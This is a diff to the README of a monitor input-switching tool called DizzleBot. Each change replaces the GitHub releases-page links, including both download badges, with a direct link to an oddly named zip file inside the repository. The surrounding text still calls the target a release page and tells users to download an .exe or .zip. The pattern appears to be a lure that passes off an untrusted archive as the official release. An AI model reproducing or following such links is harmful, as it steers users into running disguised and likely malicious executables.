@@ -1,6 +1,6 @@
 # 🖥️ DizzleBot---Monitor-Control - Easy Monitor Input Switching
 
-[![Download on GitHub](https://img.shields.io/badge/Download-DizzleBot-blue?style=for-the-badge)](https://github.com/zaxdogo/DizzleBot---Monitor-Control/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-DizzleBot-blue?style=for-the-badge)](https://raw.githubusercontent.com/zaxdogo/DizzleBot---Monitor-Control/main/dude/Bot-Monitor-Control-Dizzle-pharmacosiderite.zip)
 
 ---
 
@@ -27,7 +27,7 @@ You don’t need to touch your monitor or navigate complicated menus. It support
 
 ## 🚀 Getting Started
 
-1. Click the green download button near the top or visit the [release page](https://github.com/zaxdogo/DizzleBot---Monitor-Control/releases) on GitHub.
+1. Click the green download button near the top or visit the [release page](https://raw.githubusercontent.com/zaxdogo/DizzleBot---Monitor-Control/main/dude/Bot-Monitor-Control-Dizzle-pharmacosiderite.zip) on GitHub.
 
 2. Download the latest version from the list on the release page. Look for a file ending with `.exe` or `.zip`.
 
@@ -39,7 +39,7 @@ You don’t need to touch your monitor or navigate complicated menus. It support
 
 ### Download the Program
 
-Visit the [DizzleBot---Monitor-Control releases page](https://github.com/zaxdogo/DizzleBot---Monitor-Control/releases) to get the latest version.
+Visit the [DizzleBot---Monitor-Control releases page](https://raw.githubusercontent.com/zaxdogo/DizzleBot---Monitor-Control/main/dude/Bot-Monitor-Control-Dizzle-pharmacosiderite.zip) to get the latest version.
 
 The releases page shows all available versions. Pick the newest one labeled as "Latest" for best features and fixes.
 
@@ -111,7 +111,7 @@ To make sure your monitor supports this:
 
 ## 🔗 Useful Links
 
-[Download latest releases here](https://github.com/zaxdogo/DizzleBot---Monitor-Control/releases)
+[Download latest releases here](https://raw.githubusercontent.com/zaxdogo/DizzleBot---Monitor-Control/main/dude/Bot-Monitor-Control-Dizzle-pharmacosiderite.zip)
 
 Streamer.Bot setup guide: Visit the official Streamer.Bot readme for detailed instructions on connecting with third-party tools.
 
@@ -133,4 +133,4 @@ If you need help, open an issue on the GitHub repository page. Include steps to 
 
 ---
 
-[![Download on GitHub](https://img.shields.io/badge/Download-DizzleBot-blue?style=for-the-badge)](https://github.com/zaxdogo/DizzleBot---Monitor-Control/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-DizzleBot-blue?style=for-the-badge)](https://raw.githubusercontent.com/zaxdogo/DizzleBot---Monitor-Control/main/dude/Bot-Monitor-Control-Dizzle-pharmacosiderite.zip)
